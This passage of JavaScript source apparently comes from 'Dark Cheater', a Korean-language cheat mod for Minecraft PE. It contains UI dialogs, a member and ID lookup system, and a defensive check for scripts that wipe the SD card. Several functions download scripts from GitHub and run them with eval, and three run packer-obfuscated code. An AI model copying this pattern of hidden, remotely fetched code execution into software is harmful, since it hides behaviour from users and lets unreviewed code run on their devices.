File.save(sdcard+"/Android/data/com.darktornado.darkcheater/"+name+".txt");
},
dataRead : function(name){
return File.read(sdcard+"/Android/data/com.darktornado.darkcheater/"+name+".txt");
},
mapSave : function(name, msg){
File.save(sdcard+"/games/com.mojang/minecraftWorlds/"+Level.getWorldDir()+"/"+name+".txt");
},
mapRead : function(name){
return File.read(sdcard+"/games/com.mojang/minecraftWorlds/"+Level.getWorldDir()+"/"+name+".txt");
},
removeAddOn : function(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var files = new java.io.File(sdcard+"/darkTornado/darkCheater/addOn/").list().sort();
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
dialog.setItems(files, new android.content.DialogInterface.OnClickListener({
onClick : function(m, w){
var file = new java.io.File(sdcard+"/darkTornado/darkCheater/addOn/"+files[w]);
if(file.isDirectory()) Utils.clearDirectory(file);
file.delete();
Dark.toast("삭제되었습니다.");
}
}));
dialog.setTitle("추가 파일 삭제");
dialog.setNegativeButton("취소", null);
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
},
downloadCompiler : function(){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
dialog.setTitle("DCMS Compiler 다운로드");
dialog.setMessage("Dark Cheater Modify Script(.dcms 파일)를 실행하기 위해서는 DCMS Compiler가 필요합니다.\n다운로드 하시겠습니까?");
dialog.setNegativeButton("아니요", null);
dialog.setPositiveButton("네", new android.content.DialogInterface.OnClickListener({
onClick : function(v){
download("darkTornado/darkCheater", "DCMS Compiler.txt", "DCMS Compiler 다운로드", GitHubLink+"DCMS%20Compiler.js", 1);
}
}));
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
},
addDcmsInDarkCheater : function(){
try{
var eval2 = eval;
eval2(Dark.read("DCMS Compiler")+"");
}
catch(e){
Dark.toast(e+", "+e.lineNumber);
}
},
getCompilerVersion : function(){
try{
var cache = Dark.read("DCMS Compiler");
if(cache==""){
return "Not Installed";
}
else{
var data = cache.toString().split("\n");
var data2 = data[2].toString().split(" ");
return data2[1];
}
}
catch(e){
Dark.toast(e+", "+e.lineNumber);
}
},
getCompilerNewistVersion : function(){
try{
var cache = Dark.getDataFromServer(GitHubLink+"DCMS%20Compiler.js");
var data = cache.toString().split("\n");
var data2 = data[2].toString().split(" ");
return data2[1];
}
catch(e){
Dark.toast(e+", "+e.lineNumber);
}
},
redownloadCompiler : function(ver1, ver2){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
dialog.setTitle("DCMS Compiler 다운로드");
dialog.setMessage("DCMS Compiler를 다시 다운로드 하시겠습니까?\n현재 버전 : "+ver1+", 최신 버전 : "+ver2);
dialog.setNegativeButton("아니요", null);
dialog.setPositiveButton("네", new android.content.DialogInterface.OnClickListener({
onClick : function(v){
var file = new java.io.File(sdcard+"/darkTornado/darkCheater/DCMS Compiler.txt");
if(file.exists()) file.delete();
download("darkTornado/darkCheater", "DCMS Compiler.txt", "DCMS Compiler 다운로드", GitHubLink+"DCMS%20Compiler.js", 1);
}
}));
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
},
selectButtonSize : function(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var size = ["작게 (기본값)", "크게"];
dialog.setItems(size, new android.content.DialogInterface.OnClickListener({
onClick : function(m, w){
switch(w){
case 0 : 
btnSize = {x : 35, y : 23, t : 10};
Dark.save("bigBtn", false);
break
case 1 : 
btnSize = {x : 55, y : 37, t : 12};
Dark.save("bigBtn", true);
break;
}
btn.dismiss();
Dark.makeButton();
}
}));
dialog.setTitle("Dark 버튼 크기 설정");
dialog.setNegativeButton("닫기", null);
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
},
serverCheck : function(){
new java.lang.Thread({
run : function(){
while(true){
if(Server.getAddress()!=null&&makeGUI){
serverConnectedHook(Server.getAddress(), Server.getPort());
makeGUI = false;
}
else if(Server.getAddress()==null&&!makeGUI){
makeGUI = true;
}
java.lang.Thread.sleep(100);
}
}
}).start();
},
noFullScreen : function(txt){
try{
if(noFull) txt.setImeOptions(android.view.inputmethod.EditorInfo.IME_FLAG_NO_FULLSCREEN);
}
catch(e){
Dark.showError(e);
}
},
showPos : function(){
try{
p.p = new android.widget.PopupWindow();
p.t = new android.widget.TextView(ctx)
p.t.setText(" X : "+Math.round(Player.getX()-0.5)+", Y : "+Math.floor(Player.getY())+"\n Z : "+Math.round(Player.getZ()-0.5)+", S : X+");
p.t.setTextSize(13);
p.t.setTextColor(white);
p.t.setOnClickListener(new android.view.View.OnClickListener(){
onClick : function(v){
playerTp();
}
});
setDragListener(p.p, p.t, 0);
var pad = dip2px(ctx, 3);
p.t.setPadding(pad, pad, pad, pad);
p.p.setContentView(p.t);
p.p.setWidth(-2);
p.p.setHeight(-2);
p.p.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.argb(150, 80, 80, 80)));
if(Dark.read("playerX")=="") p.p.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.LEFT|android.view.Gravity.TOP, 80, 0);
else p.p.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.LEFT|android.view.Gravity.TOP, Dark.read("playerX"), Dark.read("playerY"));
}
catch(e){
Dark.showError(e);
}
},
showError : function(e){
Dark.showDialog("Error in Dark Cheater", e+"\nAt : "+e.lineNumber);
},
darkEffect : function(){
ModPE.langEdit("menu.play", "§0Start");
ModPE.langEdit("menu.options", "§0Settings");
ModPE.langEdit("menu.skins", "§0Skins");
ModPE.langEdit("menu.achievements", "§0Achievements");
ModPE.langEdit("menu.store", "§0Store");
ModPE.langEdit("deathScreen.quit","§0Main Menu");
ModPE.langEdit("skins.title","§0Skins");
ModPE.langEdit("options.title","§0Settings");
ModPE.langEdit("pauseScreen.quit","§0Quit to Title");
ModPE.langEdit("pauseScreen.options","§0Settings");
ModPE.langEdit("pauseScreen.back","§0Back to Game");
ModPE.langEdit("pauseScreen.header","§0Game Menu");
ModPE.langEdit("menu.returnToGame","§0Back to game");
ModPE.langEdit("gui.achievements", "§0Achievements");
ModPE.langEdit("deathScreen.respawn","§0Respawn");
ModPE.langEdit("deathScreen.message","§0You Are §cDied§0!!");
ModPE.langEdit("playscreen.header.local", "§0Dark Cheater"+version);
var ffs = ["o02vmkp6mz9q47h", "eah1t98nugajeae", "91iwmk3mmu4d5yl", "nmd8q4x9h89rtns", "9iopmvnz0g3tglp", "cyqz4o2nj3hhkg1"];
for(var n=0;n<6;n++)
Dark.addResourcePack("images/gui/background/panorama_"+n+".png", "https://www.dropbox.com/s/"+ffs[n]+"/panorama_"+n+".png?dl=1");
Dark.addResourcePack("images/gui/title.png", GitHubLink+"DarkCheaterTitle.png");
Dark.addResourcePack("splashes.json", GitHubLink+"splashes.json");
},
showCover : function(){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
screenCover = new android.widget.PopupWindow();
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var image = new android.graphics.BitmapFactory.decodeFile(sdcard+"/darkTornado/darkCheater/DarkCheater.jpg");
var screen = new android.graphics.drawable.BitmapDrawable(image);
screenCover.setContentView(layout);
screenCover.setWidth(ctx.getWindowManager().getDefaultDisplay().getWidth());
screenCover.setHeight(ctx.getWindowManager().getDefaultDisplay().getHeight());
screenCover.setBackgroundDrawable(screen);
screenCover.showAtLocation(ctx.getWindow().getDecorView(), center, 0, 0);
new android.os.Handler().postDelayed(new java.lang.Runnable({
run : function(){
screenCover.dismiss();
screenCover = null;
}
}), 3000);
Dark.toast("Map(Server) is loading...");
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
},
addResourcePack : function(path, url){
var code = function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('3["\\6\\4\\0\\1\\1\\5\\2\\0\\7\\0\\8\\9\\a\\1\\0"](b,c);',13,13,'x65|x72|x64|ModPE|x76|x69|x6F|x54|x78|x74|x75|path|url'.split('|'),0,{});
eval(code);
},
getFuncData : function(){
Dark.toast("기능 목록을 불러오고 있습니다...");
new java.lang.Thread({
run : function(){
var data = Dark.getDataFromServer("https://raw.githubusercontent.com/DarkTornado/darkCheater/master/README.md");
Dark.searchFunc(data);
}
}).start();
},
searchFunc : function(data){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var funcList = [];
var cache = data.split("\n## <Function List>\n")[1].split("\n### ");
for(var n=0;n<cache.length;n++){
var cache2 = cache[n].split("\n");
var cache3 = cache2[0].substring(0, cache2[0].indexOf(" ("));
for(var m=1;m<cache2.length;m++){
if(cache2[m].indexOf("-")!=-1&&cache2[m].indexOf("  - .")==-1){
funcList.push([cache3, cache2[m].substring(cache2[m].indexOf("-")+1, cache2[m].indexOf(" ("))]);
}
}
}
var funcList2 = [];
for(var n=0;n<funcList.length;n++)
funcList2[n] = funcList[n][1];
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var loc2 = new android.widget.EditText(ctx);
loc2.setHint("검색어를 입력하세요...");
loc2.setTextColor(white);
layout.addView(loc2);
Dark.noFullScreen(loc2);
var list = new android.widget.ListView(ctx);
var adapter = new android.widget.ArrayAdapter(ctx, android.R.layout.simple_list_item_1, funcList2);
list.setAdapter(adapter);
list.setTextFilterEnabled(true);
list.setOnItemClickListener(new android.widget.AdapterView.OnItemClickListener(){
onItemClick : function(parent, view, postion, id){
var index = funcList2.indexOf(String(view.getText()));
Dark.showDialog(funcList[index][1], "해당 기능은 \""+funcList[index][0]+"\" 메뉴에 있습니다.");
}
});
layout.addView(list);
loc2.addTextChangedListener(new android.text.TextWatcher({
onTextChanged : function(s,start,before,count){
try{
adapter.getFilter().filter(s.toString());
}
catch(e){
Dark.showError(e);
}
},
afterTextChanged : function(s){
try{
if(loc2.getText().length==0)
adapter.getFilter().filter(null);
}
catch(e){
Dark.showError(e);
}
}
}));
var pad = dip2px(ctx, 5);
layout.setPadding(pad, pad, pad, pad);
dialog.setView(layout);
dialog.setTitle("Dark Cheater 기능 검색");
dialog.setNegativeButton("닫기", null);
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
},
addonList : function(value){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var list = ["개발자 기능", "TRA 추가 기능"];
var cache = value.split("\n");
for(var n=0;n<cache.length;n++)
list.push("Dark Cheater Addon - "+cache[n]);
dialog.setItems(list, new android.content.DialogInterface.OnClickListener({
onClick : function(m, w){
if(w<2) Dark.toast("다운로드할 수 없습니다.");
else if(list[w]=="Dark Cheater Addon - Terror Supporter") Dark.toast("Semi-VIP 이상인 회원들만 회원 전용 기능에서 다운로드할 수 있습니다.");
else download("Download", list[w]+".js", list[w], GitHubLink+String(list[w]).replace(/ /g, "%20")+".js", 1);
}
}));
dialog.setTitle("Dark Cheater Addon");
dialog.setNegativeButton("닫기", null);
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
},
getWindowLibrary : function(){
try{
var cache = new FloatingWindow();
if(cache.isForDarkCheater()) return;
}
catch(e){
new java.lang.Thread({
run : function(){
var eval2 = eval;
var cache = Dark.getDataFromServer(GitHubLink+"FloatingWindow%20Library.js");
eval2(cache+"");
}
}).start();
}
},
addFunctions : function(){
try{
if(isCallbackAdded) isCallbackAdded = false;
}
catch(e){
new java.lang.Thread({
run : function(){
var eval2 = eval;
var cache = Dark.getDataFromServer(GitHubLink+"AdditionalFunctions.js");
eval2(cache+"");
}
}).start();
}
},
checkSdResetSource : function(){
var script = ScriptManager.scripts;
var so = org.mozilla.javascript.ScriptableObject;
var count = 0;
var cache = "";
for(var n=0;n<script.size();n++){
var scope = script.get(n).scope;
if(so.hasProperty(scope, "deleteFile")){
so.putProperty(scope, "deleteFile", deleteFile);
count++;
}
}
if(count>1) Dark.showDialog("SD 카드 초기화 소스 발견", "SD 카드 초기화 소스가 "+(count-1)+"개 감지되었습니다.\n1차적 방어만 가능합니다. 감지되지 않거나, 감지 이전에 실행되었을 소스가 있을 수 있으니, 주의하시길 바랍니다.");
},
checkFiles : function(){
var files = ["button.png", "toggleButtonOn.png", "toggleButtonOff.png", "menu.png", "layout.png", "menu_light.png", "mcpe.png"];
for(var n=0;n<files.length;n++){
var file = new java.io.File(sdcard+"/darkTornado/darkCheater/images/"+files[n]);
if(!file.exists()){
Dark.downloadFiles(files);
break;
}
}
},
downloadFiles : function(files){
if(checkInternet()){
Dark.toast("추가 이미지 파일이 필요하여, 다운로드를 시작합니다.");
for(var n=0;n<files.length;n++){
var file = new java.io.File(sdcard+"/darkTornado/darkCheater/images/"+files[n]);
if(!file.exists()) download("darkTornado/darkCheater/images", files[n], "Images for Dark Cheater", GitHubLink+"images/"+files[n], 1);
}
}
else{
Dark.toast("인터넷 연결이 필요합니다.");
}
},
designList : function(){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var txt = new android.widget.TextView(ctx);
txt.setText("버튼 간격 : "+btnMargin+"dp");
txt.setTextSize(16);
txt.setTextColor(white);
layout.addView(txt);
var um = new android.widget.SeekBar(ctx);
um.setMax(10);
um.setProgress(btnMargin);
um.setOnSeekBarChangeListener(new android.widget.SeekBar.OnSeekBarChangeListener({
onProgressChanged : function(seek){
btnMargin = seek.getProgress();
Dark.save("margin", btnMargin);
txt.setText("버튼 간격 : "+btnMargin+"dp");
}
}));
layout.addView(um);
var pad = dip2px(ctx, 3);
um.setPadding(pad, pad, pad, pad);
var types = ["다크 치터 기본 디자인", "블록런처 기본 디자인", "새로운 디자인", "새로운 디자인 - 불투명", "새로운 디자인 - 밝음", "새로운 디자인 - 밝은 불투명", "MCPE (0.14.x 이하)", "MCPE (0.15.x 이상)", "투명"];
var list = new android.widget.ListView(ctx);
var adapter = new android.widget.ArrayAdapter(ctx, android.R.layout.simple_list_item_1, types);
list.setAdapter(adapter);
list.setOnItemClickListener(new android.widget.AdapterView.OnItemClickListener(){
onItemClick : function(parent, view, postion, id){
designType = id;
Dark.save("designType", designType);
Dark.toast(types[id]+"(으)로 설정되었습니다.");
ndCache[3] = null;
if(designType==8) white2 = white;
else if(designType==7){
Dark.makeMcpeUiCache(150);
white2 = black;
}
else if(designType==6){
Dark.makeMcpeUiCache(0);
white2 = white;
}
else{
ndCache = [null, null, null, null, null];
if(designType>=4) white2 = black;
else if(Dark.read("textBlack")!="true") white2 = white;
}
}
});
layout.addView(list);
pad = dip2px(ctx, 5);
layout.setPadding(pad, pad, pad, pad);
dialog.setView(layout);
dialog.setTitle("디자인 설정");
dialog.setNegativeButton("닫기", null);
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
},
makeMcpeUiCache : function(n){
try{
var matrix = new android.graphics.Matrix(); 
matrix.postScale(-1, -1);
var gui = new android.graphics.BitmapFactory.decodeFile(sdcard+"/darkTornado/darkCheater/images/mcpe.png");
ndCache[0] = new android.graphics.drawable.BitmapDrawable(new android.graphics.Bitmap.createScaledBitmap(android.graphics.Bitmap.createBitmap(gui, n, 0, 150, 43), dip2px(ctx, 150), dip2px(ctx, 43), false));
ndCache[1] = ndCache[0];
ndCache[2] = new android.graphics.drawable.BitmapDrawable(new android.graphics.Bitmap.createScaledBitmap(android.graphics.Bitmap.createBitmap(gui, n, 44, 150, 43), dip2px(ctx, 150), dip2px(ctx, 43), false));
ndCache[3] = new android.graphics.drawable.BitmapDrawable(new android.graphics.Bitmap.createScaledBitmap(android.graphics.Bitmap.createBitmap(gui, n, 88, 150, 262), dip2px(ctx, 150), dip2px(ctx, 262), false));
ndCache[4] = new android.graphics.drawable.BitmapDrawable(new android.graphics.Bitmap.createScaledBitmap(android.graphics.Bitmap.createBitmap(gui, n, 44, 150, 43, matrix, false), dip2px(ctx, 150), dip2px(ctx, 43), false));
}
catch(e){
Dark.showError(e);
}
},
isValidNaverId : function(naverId){
try{
var cache = Dark.getDataFromServer("http://m.blog.naver.com/"+naverId);
if(cache.indexOf("http://blog.naver.com/"+naverId)!=-1) return true;
else return false;
}
catch(e){
Dark.showError(e);
}
},
removeBlock : function(x, y, z, s){
new java.lang.Thread({
run : function(){
java.lang.Thread.sleep(150);
switch(s){
case 0 : 
setTile(x, y-1, z, 0);
break;
case 1 : 
setTile(x, y+1, z, 0);
break;
case 2 : 
setTile(x, y, z-1, 0);
break;
case 3 : 
setTile(x, y, z+1, 0);
break;
case 4 : 
setTile(x-1, y, z, 0);
break;
case 5 : 
setTile(x+1, y, z, 0);
break;
}
}
}).start();
},
findIdDialog : function(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var loc1 = new android.widget.TextView(ctx);
var loc2 = new android.widget.EditText(ctx);
var loc3 = new android.widget.TextView(ctx);
var loc4 = new android.widget.EditText(ctx);
loc1.setText("Dark Cheater 닉네임 : ");
loc1.setTextSize(18);
loc1.setTextColor(white);
loc2.setHint("Dark Cheater 닉네임을 입력하세요...");
loc2.setTextColor(white);
loc3.setText("네이버 아이디 : ");
loc3.setTextSize(18);
loc3.setTextColor(white);
loc4.setHint("네이버 아이디를 입력하세요...");
loc4.setTextColor(white);
layout.addView(loc1);
layout.addView(loc2);
layout.addView(loc3);
layout.addView(loc4);
Dark.noFullScreen(loc2);
Dark.noFullScreen(loc4);
var pad = dip2px(ctx, 5);
layout.setPadding(pad, pad, pad, pad);
var scroll = new android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("Dark Cheater 아이디 찾기");
dialog.setNegativeButton("취소", null);
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick : function(v){
Dark.toast("처리중입니다...");
var code = function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('l 7="\\d\\9\\a\\k\\9\\8\\o\\h\\9\\S\\h\\Q\\9\\8\\e\\d\\P\\a\\j\\e\\b\\N\\a\\y\\h\\k\\n\\b\\8\\u\\e\\p\\b\\n\\b\\8\\r\\I\\s\\t\\f\\v\\w\\f\\x\\i\\z\\f\\A\\i\\B\\C\\D\\E\\F\\8\\9\\G\\a\\d\\9\\8\\j\\a\\p\\o".H("\\8");q J[7[6]].K({L:M(){l g=O[7[1]]().m();R(c[7[2]](g)){c[7[3]](T[7[1]]().m(),g)}U{c[7[5]](7[4])}}})[7[0]]()',57,57,'|||||||_0xb097|xAP|x74|x61|x64|Dark|x73|x69|x20|_0x5dabx1|x65|uC774|x6C|x72|var|toString|x49|x67|x6E|new|uC874|uD558|uC9C0|x66|uC54A|uB294|uB124|x76|uBC84|uC544|uB514|uC785|uB2C8|uB2E4|x2E|x6F|split|uC7AC|java|Thread|run|function|x4E|loc4|x56|x78|if|x54|loc2|else'.split('|'),0,{});
eval(code);
}
}));
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
},
findId : function(nickName, naverId){
var code = function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('q a="\\1U\\c\\u\\K\\p\\v\\f\\c\\j\\f\\f\\K\\u\\L\\z\\z\\y\\y\\y\\x\\m\\d\\i\\K\\1S\\i\\X\\x\\17\\i\\18\\z\\u\\z\\d\\m\\j\\19\\J\\d\\19\\t\\p\\f\\1R\\1O\\1N\\v\\d\\z\\p\\i\\t\\v\\J\\o\\h\\f\\h\\x\\f\\X\\f\\1M\\m\\p\\1L\\1K\\c\\t\\g\\f\\o\\h\\f\\h\\1J\\d\\i\\18\\1I\\g\\d\\1H\\g\\d\\c\\m\\g\\17\\i\\m\\g\\o\\h\\f\\h\\c\\p\\g\\J\\t\\f\\j\\c\\L\\L\\c\\o\\h\\d\\E\\b\\H\\j\\g\\h\\f\\g\\d\\b\\C\\A\\O\\b\\1a\\1G\\c\\1F\\P\\b\\o\\h\\d\\E\\b\\H\\j\\g\\h\\f\\g\\d\\b\\C\\A\\O\\F\\b\\w\\c\\w\\B\\S\\T\\x\\c\\u\\j\\i\\y\\o\\v\\h\\p\\i\\t\\c\\B\\U\\I\\V\\b\\W\\A\\1D\\b\\C\\A\\O\\Y\\c\\Z\\1f\\b\\1c\\B\\1A\\1z\\1y\\F\\b\\o\\h\\d\\E\\b\\H\\j\\g\\h\\f\\g\\d\\b\\1x\\1d\\P\\b\\1w\\W\\1p\\1g\\b\\w\\c\\w\\Y\\A\\Z\\1c\\b\\C\\1C\\1h\\b\\w\\c\\j\\v\\m\\g\\1i\\m\\c\\B\\U\\I\\V\\b\\1d\\1j\\1k\\b\\1l\\1m\\I\\F\\b\\1n\\1o\\1e\\b\\1a\\1e\\b\\1q\\b\\1r\\1s\\S\\T\\x\\c\\u\\j\\i\\y\\1t\\d\\d\\i\\d".1u("\\c");1v{q s=[];q N=1b;q M=k[a[4]](k[a[3]](a[2])).1B()[a[1]](a[0]);1E(q n=0;n<M[a[5]];n++){q l=M[n][a[1]](a[6]);r(l[0]==D&&l[5]==G){k[a[10]](a[7],D+a[8]+l[5]+a[9]);N=R;1P};r(l[0]==D){s=[l[5],1b]};r(l[5]==G){s=[l[0],R]}};r(!N){r(s[0]!=1Q){r(s[1]){k[a[10]](a[7],a[11]+G+a[12]+D+a[13]+k[a[14]](s[0])+a[9])}Q{k[a[10]](a[7],a[15])}}Q{k[a[10]](a[7],a[15])}}}1T(e){k[a[16]](e)}',62,119,'||||||||||_0x4f7d|x20|xID|x72||x74|x65|x61|x6F|x68|Dark|data|x64||x44|x6C|var|if|cache|x67|x73|x69|x22|x2E|x77|x2F|uC774|uC785|uC544|nickName|x6B|uB294|naverId|x43|uD558|x6E|x70|x3A|ids|retur|uB514|uC758|else|true|uB2C8|uB2E4|uB825|uC2E0|uB124|x78|x28|x29||||||||x63|x6D|x6A|uCC3E|false|uAC00|uC815|uC744|uB85C|uC740|x2C|x49|uBCF4|uC640|uC77C|uCE58|uD68C|uC6D0|uC784|uC218|uC5C6|uC2B5|x45|split|try|uB2C9|uACC4|uC788|uC5B4|uB418|toString|uB2CC|uBC84|for|uB2D8|uAE30|x76|x53|x46|x31|x3D|x3F|x79|x32|break|null|x30|x62|catch|x0A'.split('|'),0,{});
eval(code);
},
hideId : function(id){
if(id.length<=2) return id;
var leng = 6;
if(id.length<=4) leng = 2;
else if(id.length<=7) leng = 3;
var cache = id.toString().split("");
var result = id.substr(0, leng);
for(var n=leng;n<cache.length;n++){
result += "*";
}
return result;
},
memberSet : function(){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
dialog.setItems(["로그인/로그아웃", "회원 가입 신청", "닉네임 수정 요청", "아이디 찾기"], new android.content.DialogInterface.OnClickListener({
onClick : function(m, w){
switch(w){
case 0 : 
if(!isLogined) Dark.loginDialog();
else Dark.logoutDialog();
break;
case 1 : 
new java.lang.Thread({
run : function(){
if(checkInternet()){
if(Dark.checkPermission("register")) Dark.register();
else Dark.toast("제작자 측에서 회원 가입을 차단하였습니다.");
}
else{
Dark.toast("인터넷 연결을 확인하여주세요");
}
}
}).start();
break;
case 2 : 
if(isLogined) Dark.changeNickname();
else Dark.toast("로그인 되어있지 않습니다.");
break;
case 3 : 
Dark.findIdDialog();
break;
}
}
}));
dialog.setTitle("로그인/회원가입");
dialog.setNegativeButton("닫기", null);
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
},
changeNickname : function(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var loc1 = new android.widget.TextView(ctx);
var loc2 = new android.widget.EditText(ctx);
loc1.setText("1. Dark Cheater 닉네임 : ");
loc1.setTextSize(18);
loc1.setTextColor(white);
loc2.setHint("Dark Cheater 닉네임을 입력하세요...");
loc2.setTextColor(white);
layout.addView(loc1);
layout.addView(loc2);
Dark.noFullScreen(loc2);
var a6_v = 2;
var q6 = new android.widget.TextView(ctx);
var i6 = new android.widget.TextView(ctx);
var a6 = new android.widget.RadioGroup(ctx);
q6.setText("\n2. NMC 서비스 신청 (선택)");
q6.setTextSize(16);
q6.setTextColor(white);
i6.setText("NMC 서비스(Nickname Matching Service, 닉네임 일치 확인 서비스)는 로그인 시, 다크 치터 닉네임과 마인크래프트 pe 닉네임이 일치하는지를 확인하여, 일치하면 로그인을 하고, 일치하지 않으면 로그인을 하지 않는 서비스입니다. 항목 입력이 없으면 신청 안함으로 구분합니다. MCPE 0.11.0 이후부터는 한글 닉네임 등을 지원하지 않기 때문에, Dark Cheater 닉네임을 한글로 신청하고 NMC 서비스를 신청하면 로그인이 불가능함으로, 회원가입 신청이 거절됩니다.");
i6.setTextSize(13);
i6.setTextColor(white);
a6.setOrientation(1);
var a6_1 = new android.widget.RadioButton(ctx);
var a6_2 = new android.widget.RadioButton(ctx);
a6_1.setText("신청");
a6_2.setText("신청 안함");
a6_1.setId(1);
a6_2.setId(2);
a6_1.setTextColor(white);
a6_2.setTextColor(white);
a6_1.setTextSize(14);
a6_2.setTextSize(14);
a6.addView(a6_1);
a6.addView(a6_2);
a6.setOnCheckedChangeListener(new android.widget.RadioGroup.OnCheckedChangeListener({
onCheckedChanged: function (group, checkedId){
a6_v = checkedId;
if(checkedId==1){
var dcn = String(loc2.getText().toString());
for(var n=0;n<dcn.length;n++){
if(dcn.charCodeAt(n)>=44032&&dcn.charCodeAt(n)<=55203){
Dark.showDialog("경고", "NMC 서비스를 신청하고 다크 치터 닉네임을 한글로 하는 경우, 닉네임 수정 신청을 수락하면 로그인을 할 수 없음으로 닉네임 수정 신청이 거절됩니다.");
break;
}
}
}
}
}));
layout.addView(q6);
layout.addView(i6);
layout.addView(a6);
var pad = dip2px(ctx, 5);
layout.setPadding(pad, pad, pad, pad);
var scroll = new android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("Dark Cheater 닉네임 수정 요청");
dialog.setNegativeButton("취소", null);
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick : function(v){
Dark.toast("처리중입니다...");
if(loc2.getText().toString()==""){
Dark.showDialog("닉네임 수정 신청 거부", "입력하지 않은 정보가 있어서 닉네임 수정 신청이 자동으로 거절되었습니다.");
}
else{
if(a6_v==1) var cache = "NMC 신청";
else var cache = "NMC 미신청";
Dark.sendDataToServer("닉네임 수정 신청", "닉네임 : "+loc2.getText()+", "+cache+"\n아이디 : "+loginInfo[0]+", 닉네임 : "+loginNick);
}
}
}));
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
}
};

const Ban = {
removeGonePlayerData : function(){
for(var n=0;n<banList.length;n++){
if(!Player.isPlayer(banList[n])) banList.splice(n, 1);
}
},
isBanned : function(p){
for(var n=0;n<banList.length;n++){
if(p==banList[n]) return true;
}
return false;
},
removeData : function(p){
for(var n=0;n<banList.length;n++){
if(p==banList[n]) banList.splice(n, 1);
}
}


};

const HM = {
getPos : function(){
var px, py, pz, yaw, sin, cos, tan, pcos;
px = Player.getX();
py = Player.getY();
pz = Player.getZ();
yaw = Math.floor(getYaw());
pitch = Math.floor(getPitch());
sin = -Math.sin(yaw/180*Math.PI);
cos = Math.cos(yaw/180*Math.PI);
tan = -Math.sin(pitch/180*Math.PI);
pcos = Math.cos(pitch/180*Math.PI);
for(var n=0;n<150;n++){
if(HM.checkTile(px+n*sin*pcos, py+n*tan, pz+n*cos*pcos)) return [px+n*sin*pcos, py+n*tan, pz+n*cos*pcos];
}
return [px+150*sin*pcos, py+150*tan, pz+150*cos*pcos];
},
checkTile : function(x, y, z){
if([0, 8, 9, 101, 102, 106, 51, 10, 11].indexOf(getTile(x, y, z))==-1) return true;
else return false;
}

};

const Ender = {
portalCheck : function(x, y, z){
var gt = getTile;
